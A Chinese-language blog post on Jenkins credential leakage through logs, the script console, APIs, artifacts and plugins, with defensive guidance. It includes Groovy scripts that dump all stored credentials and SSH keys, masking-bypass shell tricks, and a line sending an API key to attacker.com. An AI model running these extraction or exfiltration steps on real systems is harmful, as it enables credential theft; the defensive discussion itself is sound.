---
title: "Jenkins 凭证泄露：CI/CD 流水线中隐藏的安全风险"
date: 2021-07-01
lang: zh-CN
categories: Development
tags: [Security, DevOps, Jenkins]
excerpt: "Jenkins 凭证可能通过构建日志、脚本控制台和 API 端点泄露。了解凭证如何被暴露，以及如何保护你的 CI/CD 流水线。"
thumbnail: /assets/jenkins/thumbnail.png
---

<style>
img.left-image {
  float: left;
  margin-right: 10px;
  margin-top: 30px;
  max-height: 80px;
  width: auto;
}
</style>

<a href="javascript:void(0);" class="image-wrapper"><img src="/assets/jenkins/icon.png" alt="" class="left-image"></a>
Jenkins 已成为无数 CI/CD 流水线的骨干，在全球组织中协调构建、测试和部署。其灵活性和丰富的插件生态系统使其功能强大，但这种灵活性也创造了许多凭证泄露的途径。一个配置错误的流水线或粗心的脚本，就可能将数据库密码、API 密钥或云端凭证泄露给任何有权访问构建日志的人。

本文探讨 Jenkins 凭证可能被暴露的各种方式，从明显的错误（如在构建日志中输出机密）到插件配置和 API 端点中的细微漏洞。我们将揭示 Jenkins 部署中的隐藏风险，以及保护 CI/CD 基础设施中敏感凭证的实用策略。

!!!anote "📝 适用于其他 CI/CD 系统"
    虽然本文专注于 Jenkins，但相同的凭证泄露风险也适用于其他 CI/CD 系统：
    
    **GitLab CI/CD**
    - GitLab Runner 日志可能暴露机密
    - CI/CD 变量可在任务日志中访问
    - Artifact 和测试报告可能包含凭证
    - API 端点暴露流水线配置
    
    **GitHub Actions**
    - 工作流日志暴露回显的机密
    - Actions 可以访问并泄漏机密
    - Artifact 可能包含嵌入的凭证
    - 调试模式增加暴露风险
    
    **一般原则**
    - 构建/任务日志是主要的暴露向量
    - Artifact 和报告会持久化凭证
    - API 访问暴露配置
    - 讨论的缓解策略普遍适用

## 理解 Jenkins 凭证

在深入探讨泄露风险之前，理解 Jenkins 如何管理凭证至关重要。Jenkins 提供集中式凭证存储，旨在保护机密安全，同时使流水线和任务能够访问它们。

### Jenkins 凭证系统

Jenkins 凭证有多种类型，各自针对特定用途设计：

!!!anote "🔑 Jenkins 凭证类型"
    **用户名与密码**
    - 基本身份验证凭证
    - 用于 Git 仓库、artifact 服务器、API
    - 以加密的键值对存储
    - 最常见的凭证类型
    
    **机密文本**
    - 单一机密值（API 密钥、令牌）
    - 用于云端供应商凭证、webhook 机密
    - 在 Jenkins 凭证存储中加密
    - 简单但多功能
    
    **机密文件**
    - 包含机密的完整文件（证书、kubeconfig）
    - 加密存储，在构建期间作为临时文件公开
    - 用于 SSH 密钥、TLS 证书、配置文件
    
    **SSH 用户名与私钥**
    - 用于 Git 和远程服务器的 SSH 身份验证
    - 私钥加密存储
    - 支持密码保护
    
    **证书**
    - 用于双向 TLS 的客户端证书
    - PKCS#12 密钥存储
    - 用于安全的服务对服务通信

凭证存储使用存储在 `$JENKINS_HOME/secrets/master.key` 的主密钥加密机密。这种加密保护静态凭证，但一旦凭证在流水线中使用，它们就会通过各种渠道变得容易泄露。

### 凭证范围与访问控制

Jenkins 凭证具有范围和访问控制，决定它们可以在哪里使用：

!!!tip "🛡️ 凭证范围"
    **系统范围**
    - 仅供 Jenkins 系统使用（插件、配置）
    - 任务或流水线无法访问
    - 用于 Jenkins 对 Jenkins 通信、插件配置
    
    **全局范围**
    - 所有任务和流水线都可使用
    - 最常用的范围
    - 如果任务被入侵，泄露风险最高
    
    **文件夹范围（使用 Folders 插件）**
    - 凭证限定于特定文件夹
    - 限制暴露于任务子集
    - 比全局范围更好的隔离
    
    **访问控制**
    - 通过插件实现基于角色的访问控制（RBAC）
    - 凭证权限与任务权限分离
    - 用户可以使用凭证而无需查看它们

理解这些范围至关重要，因为许多凭证泄露发生在全局凭证被用于不需要如此广泛访问权限的任务时。

## 构建日志泄露：最常见的错误

最常见的凭证泄露发生在构建日志中——Jenkins 存储并向用户显示的流水线执行详细输出。

### 意外的 Echo 和 Print 语句

开发人员经常通过打印变量值来调试流水线，却忘记凭证也只是变量：

```groovy
// 声明式流水线 - 危险
pipeline {
    agent any
    environment {
        DB_PASSWORD = credentials('database-password')
    }
    stages {
        stage('Debug') {
            steps {
                // 这会将密码打印到构建日志！
                sh "echo Database password is: ${DB_PASSWORD}"
                
                // 这也会暴露它
                echo "Connecting with password: ${DB_PASSWORD}"
            }
        }
    }
}
```

构建日志将包含：

```
[Pipeline] sh
+ echo Database password is: SuperSecret123!
Database password is: SuperSecret123!
[Pipeline] echo
Connecting with password: SuperSecret123!
```

任何有权访问构建日志的人——通常包括所有开发人员——现在都可以看到密码。

### 环境变量转储

另一个常见错误是为了调试而转储所有环境变量：

```groovy
pipeline {
    agent any
    environment {
        AWS_ACCESS_KEY = credentials('aws-access-key')
        AWS_SECRET_KEY = credentials('aws-secret-key')
    }
    stages {
        stage('Debug Environment') {
            steps {
                // 暴露所有环境变量，包括凭证
                sh 'env'
                
                // 同样危险
                sh 'printenv'
                
                // 这也可能泄漏凭证
                sh 'set'
            }
        }
    }
}
```

输出会揭示加载到环境中的所有凭证：

```
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### 详细命令输出

某些命令会产生包含凭证的详细输出：

```groovy
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                withCredentials([usernamePassword(
                    credentialsId: 'api-credentials',
                    usernameVariable: 'API_USER',
                    passwordVariable: 'API_PASS'
                )]) {
                    // curl 的 -v 标志会在标头中暴露凭证
                    sh 'curl -v -u ${API_USER}:${API_PASS} https://api.example.com/deploy'
                }
            }
        }
    }
}
```

详细输出包含带有凭证的 Authorization 标头：

```
> GET /deploy HTTP/1.1
> Authorization: Basic QVBJVVNFUjpBUElQQVNT
> User-Agent: curl/7.68.0
```

虽然是 base64 编码，但这很容易解码以揭示用户名和密码。

!!!warning "⚠️ 构建日志泄露风险"
    **谁可以访问构建日志**
    - 所有具有任务读取权限的用户
    - 通常包括整个开发团队
    - 默认情况下日志无限期存储
    - 可通过 Web UI 和 API 访问
    
    **泄露的持久性**
    - 日志存储在 `$JENKINS_HOME/jobs/*/builds/*/log`
    - 即使在凭证轮换后仍可访问
    - 包含在 Jenkins 备份中
    - 可能被转发到日志聚合系统
    
    **影响范围**
    - 暴露的凭证可以访问生产系统
    - 可能授予超出 Jenkins 环境的访问权限
    - 事后难以检测泄露
    - 所有暴露的凭证都需要轮换

## 脚本控制台：管理后门

Jenkins 提供 Groovy 脚本控制台用于管理任务，但这个强大功能可能被利用来提取凭证。

### 直接凭证访问

具有脚本控制台访问权限的用户可以直接查询凭证存储：

```groovy
// 脚本控制台 - 提取所有凭证
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*

def creds = CredentialsProvider.lookupCredentials(
    StandardUsernamePasswordCredentials.class,
    Jenkins.instance,
    null,
    null
)

creds.each { c ->
    println "ID: ${c.id}"
    println "Username: ${c.username}"
    println "Password: ${c.password}"
    println "---"
}
```

此脚本以明文输出所有用户名/密码凭证：

```
ID: database-credentials
Username: dbadmin
Password: SuperSecret123!
---
ID: api-credentials
Username: apiuser
Password: ApiKey789!
---
```

### 机密文本提取

机密文本凭证同样容易受到攻击：

```groovy
import com.cloudbees.plugins.credentials.*
import org.jenkinsci.plugins.plaincredentials.*

def secrets = CredentialsProvider.lookupCredentials(
    StringCredentials.class,
    Jenkins.instance,
    null,
    null
)

secrets.each { s ->
    println "ID: ${s.id}"
    println "Secret: ${s.secret}"
    println "---"
}
```

输出：

```
ID: aws-secret-key
Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
---
ID: slack-webhook
Secret: https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXX
---
```

### SSH 密钥提取

甚至 SSH 私钥也可以被提取：

```groovy
import com.cloudbees.jenkins.plugins.sshcredentials.*

def sshCreds = CredentialsProvider.lookupCredentials(
    SSHUserPrivateKey.class,
    Jenkins.instance,
    null,
    null
)

sshCreds.each { c ->
    println "ID: ${c.id}"
    println "Username: ${c.username}"
    println "Private Key:"
    println c.privateKey
    println "---"
}
```

这会以 PEM 格式输出完整的私钥，可直接用于未经授权的访问。

!!!error "🚫 脚本控制台风险"
    **访问控制问题**
    - 需要「Overall/RunScripts」权限
    - 通常授予资深开发人员和 DevOps
    - 基本 Jenkins 中没有脚本执行的审计轨迹
    - 脚本以完整的 Jenkins 权限执行
    
    **检测挑战**
    - 没有内置的脚本控制台使用日志记录
    - 难以检测凭证提取
    - 没有可疑脚本执行的警报
    - 需要额外的插件来建立审计轨迹
    
    **缓解复杂性**
    - 无法在不失去功能的情况下禁用脚本控制台
    - 限制访问可能影响合法管理
    - 需要信任所有具有脚本访问权限的用户
    - 考虑使用 Script Security 插件进行限制

## API 泄露：程序化访问

Jenkins 提供广泛的 REST 和 CLI API，可能会通过各种端点无意中暴露凭证。

### 任务配置 XML

可以通过 API 检索任务配置，可能会暴露嵌入在 XML 中的凭证：

```bash
# 检索任务配置
curl -u admin:token https://jenkins.example.com/job/my-pipeline/config.xml
```

如果凭证在任务配置中硬编码（这是不良做法但令人惊讶地常见）：

```xml
<project>
  <builders>
    <hudson.tasks.Shell>
      <command>
        mysql -h db.example.com -u dbuser -pHardcodedPassword123! -e "SELECT * FROM users"
      </command>
    </hudson.tasks.Shell>
  </builders>
</project>
```

密码在 XML 响应中以明文暴露。

### 构建 Artifact 和测试报告

凭证可能通过归档的 artifact 和测试报告泄漏：

```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                withCredentials([string(
                    credentialsId: 'api-key',
                    variable: 'API_KEY'
                )]) {
                    // 将凭证写入配置文件
                    sh 'echo "api_key: $API_KEY" > config.yaml'
                    
                    // 归档文件 - 凭证现在在 artifact 中！
                    archiveArtifacts artifacts: 'config.yaml'
                }
            }
        }
        stage('Test') {
            steps {
                // 测试报告包含环境变量
                sh 'pytest --verbose --capture=no'
                
                // JUnit 报告可能在输出中包含凭证
                junit 'test-results/*.xml'
            }
        }
    }
}
```

!!!error "🚫 Artifact 和报告泄露"
    **归档的 Artifact**
    - 嵌入凭证的配置文件
    - 包含机密的构建输出
    - 可通过 Web UI 和 API 访问
    - 除非清理，否则无限期保留
    - 开发人员下载用于调试
    
    **测试报告**
    - JUnit XML 报告可能捕获 stdout/stderr
    - 测试失败通常包含环境上下文
    - 带有详细输出的 HTML 报告
    - 所有具有任务读取权限的用户都可访问

### 构建参数和环境变量

API 端点暴露构建参数和环境变量：

```bash
# 获取包含参数的构建信息
curl -u admin:token https://jenkins.example.com/job/my-pipeline/1/api/json?tree=actions[parameters[*]]
```

如果凭证作为参数传递，响应可能包含凭证值：

```json
{
  "actions": [{
    "parameters": [{
      "name": "DB_PASSWORD",
      "value": "SuperSecret123!"
    }]
  }]
}
```

### 凭证插件 API

某些凭证插件暴露可能泄漏信息的 API：

```bash
# 列出所有凭证（某些插件允许这样做）
curl -u admin:token https://jenkins.example.com/credentials/api/json
```

虽然正确配置的插件会掩码凭证值，但配置错误或插件漏洞可能会暴露它们。

!!!warning "⚠️ API 泄露向量"
    **配置导出**
    - 任务配置可能包含嵌入的机密
    - 存储在 Jenkins 中的流水线定义（而非 SCM）
    - 带有 API 密钥的插件配置
    - 带有系统凭证的全局配置
    
    **构建 Artifact 和报告**
    - 归档的 artifact 中的凭证
    - 带有机密的配置文件
    - 带有凭证输出的测试报告
    - 归档为 artifact 的日志文件
    - 可通过 artifact API 端点访问
    
    **插件漏洞**
    - 插件可能通过自定义 API 暴露凭证
    - 凭证处理中的安全漏洞
    - 插件端点上的访问控制不足
    - 具有已知问题的过时插件

## 插件生态系统：第三方风险

Jenkins 广泛的插件生态系统通过插件特定的漏洞和配置错误引入了额外的凭证泄露风险。

### Credential Binding 插件问题

Credential Binding 插件虽然设计用于安全地暴露凭证，但可能被滥用：

```groovy
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                withCredentials([string(
                    credentialsId: 'api-key',
                    variable: 'API_KEY'
                )]) {
                    // 将凭证写入文件会暴露它
                    sh 'echo $API_KEY > /tmp/api-key.txt'
                    
                    // 文件在构建后仍保留在代理上
                    sh 'curl -H "Authorization: Bearer $API_KEY" https://api.example.com'
                }
            }
        }
    }
}
```

凭证被写入一个在代理上持久存在的文件，其他任务或具有代理访问权限的用户可以访问。

### Mask Passwords 插件：军备竞赛

现代 Jenkins 插件（如 Mask Passwords 和 Credentials Binding）试图检测并掩码构建日志中的凭证，甚至处理 base64 编码的值。然而，人类的创造力始终能击败自动检测：

```groovy
pipeline {
    agent any
    options {
        maskPasswords()
    }
    environment {
        PASSWORD = credentials('my-password')
    }
    stages {
        stage('Test') {
            steps {
                // 在日志中被掩码：****
                sh 'echo $PASSWORD'
                
                // 现代插件可以检测并掩码这个
                sh 'echo $PASSWORD | base64'
                
                // 但人类的创造力找到了绕过的方法：
                
                // 逐字符打印
                sh 'for i in $(seq 0 ${#PASSWORD}); do echo -n "${PASSWORD:$i:1}"; done'
                
                // 十六进制编码
                sh 'echo $PASSWORD | xxd -p'
                
                // ROT13 或简单密码
                sh 'echo $PASSWORD | tr "A-Za-z" "N-ZA-Mn-za-m"'
                
                // 反转字符串
                sh 'echo $PASSWORD | rev'
                
                // URL 编码
                sh 'python3 -c "import urllib.parse; print(urllib.parse.quote(\"$PASSWORD\"))"'
                
                // 分割和串接
                sh 'P1=${PASSWORD:0:5}; P2=${PASSWORD:5}; echo "Part1: $P1, Part2: $P2"'
            }
        }
    }
}
```

!!!warning "⚠️ 检测军备竞赛"
    **插件能力**
    - 现代插件检测精确的凭证匹配
    - 可以识别 base64 编码的凭证
    - 常见编码方案的模式匹配
    - 持续更新新的检测模式
    
    **人类创造力总是获胜**
    - 无限种转换字符串的方法
    - 自定义编码方案
    - 字符操作和分割
    - 通过多重转换进行混淆
    - 插件无法预测所有可能的转换
    
    **根本问题**
    - 检测是被动的，创造力是主动的
    - 每种新的检测方法都会产生新的绕过技术
    - 不能仅依赖自动掩码
    - 通过安全设计进行预防至关重要
    - 教育和代码审查仍然很关键

检测插件和绕过技术之间的军备竞赛说明了一个基本事实：你不能依赖自动掩码来保护凭证。唯一可靠的方法是从一开始就不要将凭证暴露在构建日志中。

### Git 插件凭证泄漏

Git 操作可能以各种方式暴露凭证：

```groovy
pipeline {
    agent any
    stages {
        stage('Checkout') {
            steps {
                // 凭证嵌入在 URL 中
                git url: 'https://user:password@github.com/org/repo.git'
                
                // 出现在构建日志和 git 配置中
                // 存储在代理上的 .git/config 中
            }
        }
    }
}
```

凭证出现在：
- 检出期间的构建日志
- 代理上的 `.git/config` 文件
- Git reflog 和历史记录
- git 操作期间的进程列表

!!!error "🚫 插件相关风险"
    **插件漏洞**
    - 插件可能有凭证处理错误
    - 安全补丁并不总是及时应用
    - 某些插件不安全地存储凭证
    - 自定义插件可能缺乏安全审查
    
    **配置复杂性**
    - 每个插件都有独特的凭证处理方式
    - 容易引入配置错误
    - 文档可能不完整
    - 安全最佳实践并不总是清楚
    
    **更新挑战**
    - 插件更新可能破坏现有任务
    - 由于兼容性问题，安全更新延迟
    - 漏洞披露可能滞后于发现
    - 没有插件的自动安全扫描

## 常见泄露情境

理解凭证通常如何被暴露，有助于组织识别并防止自己的 Jenkins 部署中的类似漏洞。

### 公开可访问的 Jenkins 实例

未经适当身份验证就暴露在互联网上的 Jenkins 实例代表着关键漏洞：

!!!warning "⚠️ 公开暴露风险"
    **常见配置错误**
    - 从未配置默认安全设置
    - 用于测试的「快速设置」留在生产环境中
    - 防火墙规则配置错误或被绕过
    - 脚本控制台无需身份验证即可访问
    
    **潜在影响**
    - 所有凭证都可通过脚本控制台提取
    - 云端供应商凭证使资源劫持成为可能
    - 数据库凭证暴露客户数据
    - 源代码仓库访问被入侵
    - 可能完全入侵基础设施
    
    **预防措施**
    - 永远不要将 Jenkins 直接暴露在互联网上
    - 要求所有访问都需要身份验证
    - 使用 VPN 或堡垒主机进行远程访问
    - 定期进行安全配置审计
    - 监控未经授权的访问尝试

### 长期构建日志泄露

在构建输出中记录的凭证可能会长期暴露：

!!!warning "⚠️ 构建日志风险"
    **如何发生**
    - 为调试启用详细日志记录
    - 调试语句从未从流水线中移除
    - 所有开发人员都可访问日志
    - 日志包含在备份和日志聚合系统中
    - 没有自动凭证扫描
    
    **泄露持续时间**
    - 凭证可能暴露数月或数年
    - 难以确定是否被未经授权的方访问
    - 需要大量的凭证轮换
    - 可能需要完整的安全审计
    
    **缓解措施**
    - 定期对 CI/CD 流水线进行安全审计
    - 自动扫描日志中的凭证
    - 考虑安全性的构建日志保留策略
    - 日志访问的最小权限原则
    - 定期审查流水线代码以防凭证泄露

### 插件漏洞

Jenkins 插件中的安全漏洞可能通过各种向量暴露凭证：

!!!error "🚫 插件安全风险"
    **常见漏洞模式**
    - 未经身份验证的 API 端点暴露凭证
    - 凭证检索的访问控制不足
    - 插件数据中的不安全凭证存储
    - 通过错误消息泄漏信息
    
    **组织挑战**
    - 插件更新可能破坏现有任务
    - 由于兼容性测试，安全补丁延迟
    - 组织不知道正在使用的易受攻击插件
    - 没有插件的自动漏洞扫描
    
    **最佳实践**
    - 维护已安装插件的清单
    - 订阅 Jenkins 安全公告
    - 实施快速补丁流程
    - 在选择标准中考虑插件安全性
    - 定期对 Jenkins 实例进行漏洞扫描

## 真实事件:当编码的凭证并不安全

当你在生产环境中发现凭证泄露时,理论就变成了现实。我亲身经历过这种情况,当时一位同事将他的凭证存储在 Jenkins 中,以为系统的编码会保护它们。

Jenkins 任务执行成功,但构建日志包含了他的编码凭证——任何有权访问日志的人都能看到。编码提供了一种虚假的安全感;base64 和类似方案都是可以轻易逆转的。对于未经训练的眼睛来说,它看起来像是随机字符串,但实际上是他的用户名和密码,只需一个解码命令就能还原成明文。

当我发现泄露时,我的同事正在休假。这些凭证在多个系统中拥有广泛的访问权限,使情况变得危急。我不能等他回来——每一小时都会增加未经授权访问的风险。

我立即向他的主管报告。这次对话虽然不舒服但很必要:「你的团队成员的凭证在 Jenkins 日志中被暴露了。它们需要立即轮换。」他的主管理解严重性并迅速采取行动,锁定账户并启动密码重置。安全团队审查了访问日志,以查找泄露期间的任何可疑活动。

这次事件突显了几个痛苦的真相:

!!!error "🚨 真实泄露的教训"
    **编码不是加密**
    - Base64、十六进制和 URL 编码都是可逆转换
    - 任何有权访问日志的人都可以解码凭证
    - Jenkins 凭证掩码无法捕获所有编码方案
    - 开发人员经常误解两者的区别
    
    **泄露在发现后仍持续存在**
    - 日志在凭证轮换后仍可访问
    - 不知道谁在泄露期间访问了日志
    - 备份和日志聚合系统保留副本
    - 通常无法重建完整的审计轨迹
    
    **组织影响**
    - 紧急响应中断正常运作
    - 对受影响个人的信任影响
    - 需要对所有流水线进行更广泛的安全审查
    
    **访问权限放大风险**
    - 具有广泛权限的凭证会产生更大的爆炸半径
    - 单一泄露可能危及多个系统
    - 最小权限原则变得至关重要
    - 服务账户需要与用户账户相同的保护

这次事件迫使我们对 Jenkins 安全实践进行全面审查。我们实施了自动凭证扫描,根据凭证敏感性限制日志访问,并进行安全培训,强调编码不提供安全性。最重要的是,我们建立了明确的未来事件升级程序——无论谁受到影响或他们是否在场,都不应该犹豫报告凭证泄露。

当发现暴露的凭证时,立即采取行动。

## 保护 Jenkins 凭证

防止凭证泄露需要跨 Jenkins 配置、流水线设计和操作实践的多层防御。

### 安全流水线实践

设计流水线以最小化凭证泄露：

```groovy
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                withCredentials([usernamePassword(
                    credentialsId: 'api-credentials',
                    usernameVariable: 'API_USER',
                    passwordVariable: 'API_PASS'
                )]) {
                    // 使用凭证而不回显
                    sh '''
                        # 禁用命令回显
                        set +x
                        
                        # 在命令中使用凭证
                        curl -s -u "$API_USER:$API_PASS" https://api.example.com/deploy
                        
                        # 为后续命令重新启用回显
                        set -x
                    '''
                }
            }
        }
    }
}
```

关键实践：
- 使用 `set +x` 在使用凭证时禁用命令回显
- 避免打印环境变量
- 使用 `withCredentials` 块限制凭证范围
- 永远不要将凭证写入文件

### 凭证范围限制

使用文件夹范围的凭证限制凭证可用性：

!!!success "✅ 凭证范围最佳实践"
    **使用 Folder 插件**
    - 按团队或项目将任务组织到文件夹中
    - 创建限定于特定文件夹的凭证
    - 防止其他文件夹中的任务访问凭证
    - 减少被入侵任务的爆炸半径
    
    **最小权限原则**
    - 为每个用例创建单独的凭证
    - 避免跨多个任务重复使用凭证
    - 尽可能使用只读凭证
    - 定期轮换凭证
    
    **凭证命名**
    - 使用指示范围和目的的描述性 ID
    - 避免使用「password」或「api-key」等通用名称
    - 在名称中包含环境（prod-db-password vs dev-db-password）
    - 记录凭证目的和授权使用

### 访问控制和审计

实施严格的访问控制和监控：

!!!tip "🔒 访问控制措施"
    **基于角色的访问控制**
    - 使用 Role Strategy 或 Folder Authorization 插件
    - 将凭证管理与任务执行权限分离
    - 限制脚本控制台访问给最少的用户
    - 定期审查用户权限
    
    **审计日志记录**
    - 启用 Audit Trail 插件进行凭证访问日志记录
    - 监控脚本控制台使用情况
    - 对正常模式之外的凭证检索发出警报
    - 将 Jenkins 日志与 SIEM 系统集成
    
    **构建日志安全**
    - 限制构建日志保留期限
    - 根据凭证敏感性限制日志访问（见下方注意事项）
    - 实施自动扫描日志中的凭证
    - 考虑对敏感流水线进行日志加密
    
    **构建日志访问注意事项**
    - 任务拥有者通常不拥有任务中使用的凭证
    - 生产凭证通常由安全团队拥有
    - 具有日志访问权限的任务拥有者可以查看暴露的凭证
    - 解决方案：限制日志访问给凭证拥有者，而非任务拥有者
    - 替代方案：自动凭证掩码（不完美，见前面章节）
    - 最佳方法：完全防止日志中的凭证泄露

### 分离凭证管理与任务执行

一个关键的安全实践是将谁可以管理凭证与谁可以在任务中使用它们分开。这种分离防止开发人员查看凭证值，同时仍允许他们在流水线中使用凭证。

#### 没有分离的问题

默认情况下，Jenkins 通常授予广泛的权限：

```groovy
// 没有适当分离，具有任务配置访问权限的开发人员可以：
pipeline {
    agent any
    stages {
        stage('Extract Credentials') {
            steps {
                withCredentials([string(
                    credentialsId: 'production-api-key',
                    variable: 'API_KEY'
                )]) {
                    // 开发人员可以修改流水线以暴露凭证
                    sh 'echo $API_KEY'
                    sh 'echo $API_KEY | base64'
                    sh 'curl https://attacker.com?key=$API_KEY'
                }
            }
        }
    }
}
```

!!!error "🚫 没有权限分离的风险"
    **开发人员可以做什么**
    - 修改流水线以将凭证回显到构建日志
    - 在构建 artifact 中归档凭证
    - 将凭证发送到外部系统
    - 通过测试报告提取凭证
    - 如果被授予访问权限，使用脚本控制台
    
    **为什么这很危险**
    - 开发人员需要执行任务但不需要看到凭证值
    - 任务配置访问 = 凭证提取能力
    - 没有技术障碍防止凭证泄露
    - 完全依赖开发人员的可信度
    - 单一恶意或被入侵的开发人员账户暴露所有凭证

#### 实施权限分离

使用 Role Strategy 插件或 Folder Authorization 插件来分离权限：

**Role Strategy 插件配置：**

```
全局角色：
  - credential-admin: Credential/Create, Credential/Update, Credential/View, Credential/Delete
  - developer: Job/Build, Job/Read, Job/Workspace
  - pipeline-admin: Job/Configure, Job/Create, Job/Delete

项目角色（每个文件夹）：
  - team-developer: Job/Build, Job/Read, Credential/UseItem
  - team-lead: Job/Configure, Credential/UseItem
  - security-admin: Credential/ManageDomains, Credential/Create, Credential/Update
```

!!!success "✅ 权限分离的好处"
    **凭证管理员**
    - 创建和管理凭证
    - 查看和更新凭证值
    - 无法修改任务配置
    - 通常是安全团队或资深 DevOps
    
    **流水线管理员**
    - 配置和创建任务
    - 无法查看凭证值
    - 可以指定任务使用哪些凭证（通过 ID）
    - 无法通过任务修改提取凭证值
    
    **开发人员**
    - 执行任务并查看构建日志
    - 无法修改任务配置
    - 无法查看或管理凭证
    - 只能通过预先配置的任务使用凭证

#### 实际实施

开发团队的实用权限模型：

```
文件夹：/production-deployments/
  凭证：
    - prod-db-password（由安全团队管理）
    - prod-api-key（由安全团队管理）
  
  权限：
    - security-team: Credential/Create, Credential/Update, Credential/View, Credential/Delete
    - devops-leads: Job/Configure, Credential/UseItem（可以使用但不能查看）
    - developers: Job/Build, Job/Read（可以执行但不能修改）

文件夹：/development/
  凭证：
    - dev-db-password（由团队负责人管理）
    - dev-api-key（由团队负责人管理）
  
  权限：
    - team-leads: Credential/Create, Credential/Update, Job/Configure
    - developers: Job/Build, Job/Configure, Credential/UseItem
```

!!!anote "🎯 关键原则"
    **分离防止**
    - 开发人员修改生产流水线以提取凭证
    - 通过流水线变更意外暴露凭证
    - 被入侵账户的恶意凭证提取
    - 不满员工的内部威胁
    
    **分离允许**
    - 开发人员使用凭证执行任务
    - 流水线管理员配置任务使用哪些凭证
    - 安全团队管理敏感凭证
    - 谁访问了哪些凭证的审计轨迹
    
    **重要限制**
    - 如果流水线已经记录凭证，则无法防止凭证泄露
    - 无法防止脚本控制台访问（单独的权限）
    - 无法防止通过 artifact 或报告的泄露
    - 必须与安全流水线实践结合
    - 流水线管理员仍然可以配置任务以暴露凭证

#### 监控和执行

必须监控和执行权限分离：

```groovy
// 检查权限分离的审计脚本
import jenkins.model.Jenkins
import com.cloudbees.plugins.credentials.*
import hudson.security.*

def jenkins = Jenkins.instance
def strategy = jenkins.getAuthorizationStrategy()

// 检查谁有凭证管理权限
def credentialAdmins = []
def jobConfigurers = []

strategy.getGrantedPermissions().each { permission, users ->
    if (permission.toString().contains('Credential')) {
        credentialAdmins.addAll(users)
    }
    if (permission.toString().contains('Job/Configure')) {
        jobConfigurers.addAll(users)
    }
}

// 如果相同用户同时拥有两种权限，则发出警报
def overlap = credentialAdmins.intersect(jobConfigurers)
if (overlap) {
    println "警告：同时拥有凭证和任务配置权限的用户：${overlap}"
}
```

!!!tip "🔍 执行最佳实践"
    **定期审计**
    - 每季审查权限分配
    - 检查具有过多权限的用户
    - 验证组织变更后是否维持分离
    - 审计凭证使用模式
    
    **自动监控**
    - 当用户获得凭证管理权限时发出警报
    - 监控权限提升尝试
    - 按用户和任务追踪凭证访问
    - 检测异常的凭证使用模式
    
    **策略执行**
    - 在安全策略中记录权限模型
    - 要求批准凭证管理访问
    - 定期培训权限分离的理由
    - 权限违规的事件响应计划

权限分离是一个关键的防御层，但它并非万无一失。可以配置任务的流水线管理员仍然可以编写暴露凭证的流水线。真正的保护来自于将权限分离与安全流水线实践、代码审查和自动凭证扫描相结合。

### 外部机密管理：并非万灵丹

外部机密管理系统降低风险，但不能消除泄露向量：

```groovy
// 使用 HashiCorp Vault
pipeline {
    agent any
    stages {
        stage('Deploy') {
            steps {
                script {
                    // 在运行时从 Vault 检索机密
                    def secrets = vault(
                        path: 'secret/data/myapp',
                        engineVersion: 2
                    )
                    
                    // 如果记录，机密仍然会暴露！
                    sh "echo API Key: ${secrets.api_key}"  // 仍然危险
                    
                    // 机密仍然在 artifact 中暴露
                    sh "echo 'key: ${secrets.api_key}' > config.yaml"
                    archiveArtifacts 'config.yaml'  // 仍然暴露
                    
                    // 正确用法 - 没有日志记录或 artifact
                    sh """
                        set +x
                        curl -H "Authorization: Bearer ${secrets.api_key}" \
                             https://api.example.com/deploy
                    """
                }
            }
        }
    }
}
```

!!!warning "⚠️ 外部机密无法防止所有泄露"
    **外部机密解决什么**
    - 凭证不在 Jenkins 中静态存储
    - 集中式凭证管理和轮换
    - 机密访问的审计日志记录
    - 短期、动态凭证
    - 如果 Jenkins 被入侵，减少爆炸半径
    
    **外部机密无法解决什么**
    - 构建日志泄露（如果回显，机密仍会被记录）
    - Artifact 泄露（如果写入文件，机密仍会被归档）
    - 测试报告泄露（机密仍在测试输出中）
    - 脚本控制台访问（机密在内存中仍可访问）
    - API 泄露（机密仍在构建参数/环境中）
    
    **根本真相**
    - 外部机密管理改变机密存储的位置
    - 它不改变机密在流水线中的使用方式
    - 所有泄露向量（日志、artifact、报告）仍然存在
    - 安全流水线实践仍然至关重要
    - 不能仅依赖外部机密来保证安全

!!!success "✅ 外部机密管理的好处"
    **与安全实践结合时**
    - 集中控制和审计日志记录
    - 动态、短期凭证
    - 更容易的轮换和撤销
    - 关注点分离
    - 减少 Jenkins 攻击面
    
    **热门解决方案**
    - HashiCorp Vault
    - AWS Secrets Manager
    - Azure Key Vault
    - Google Secret Manager
    - CyberArk
    
    **关键要求**
    - 必须与安全流水线设计结合
    - 消除日志记录、artifact 和报告泄露
    - 外部机密是一层，而非完整解决方案

## 检测和响应

即使有预防措施，检测和响应凭证泄露也至关重要。

### 自动凭证扫描

实施自动扫描以检测暴露的凭证：

!!!tip "🔍 扫描策略"
    **构建日志扫描**
    - 常见凭证格式的正则表达式模式
    - API 密钥模式（AWS、GitHub、Slack 等）
    - 日志中类似密码的字符串
    - Base64 编码的凭证
    
    **配置扫描**
    - 扫描任务配置中的硬编码机密
    - 检查 Jenkins 中的流水线定义
    - 审计插件配置
    - 审查全局 Jenkins 配置
    
    **工具和集成**
    - git-secrets 用于仓库扫描
    - truffleHog 用于凭证检测
    - Jenkins 特定模式的自定义脚本
    - 与 CI/CD 流水线集成以进行自动检查

### 事件响应程序

为凭证泄露事件建立明确的程序：

!!!anote "🚨 事件响应步骤"
    **立即行动**
    1. 识别暴露的凭证及其范围
    2. 立即轮换被入侵的凭证
    3. 审查访问日志以查找未经授权的使用
    4. 如果无法轮换，则禁用被入侵的账户
    
    **调查**
    1. 确定泄露持续时间和访问范围
    2. 识别谁有权访问暴露的凭证
    3. 检查未经授权访问的迹象
    4. 记录时间轴和影响
    
    **补救**
    1. 修复泄露的根本原因
    2. 更新流水线以防止再次发生
    3. 实施额外控制
    4. 对受影响的团队进行安全培训
    
    **事后**
    1. 记录经验教训
    2. 更新安全程序
    3. 在组织内分享知识
    4. 安排后续审查

## 结论

